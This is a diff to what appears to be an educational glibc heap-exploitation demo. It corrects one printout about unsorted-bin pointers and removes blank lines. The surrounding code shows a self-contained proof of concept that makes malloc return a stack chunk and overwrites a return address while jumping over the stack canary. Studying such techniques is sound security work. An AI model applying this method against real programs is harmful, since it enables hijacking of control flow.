@@ -89,7 +89,7 @@ int main(int argc, char * argv[]){
   fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
   free((void*)victim);
 
-  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
+  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\n");
   fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
   fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
 
@@ -119,7 +119,6 @@ int main(int argc, char * argv[]){
 
   void *p3 = malloc(0x100);
 
-
   fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
   char *p4 = malloc(0x100);
   fprintf(stderr, "p4 = malloc(0x100)\n");
@@ -129,7 +128,7 @@ int main(int argc, char * argv[]){
 
   fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
-  
+
   long offset = (long)__builtin_frame_address(0) - (long)p4;
   memcpy((p4+offset+8), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
 
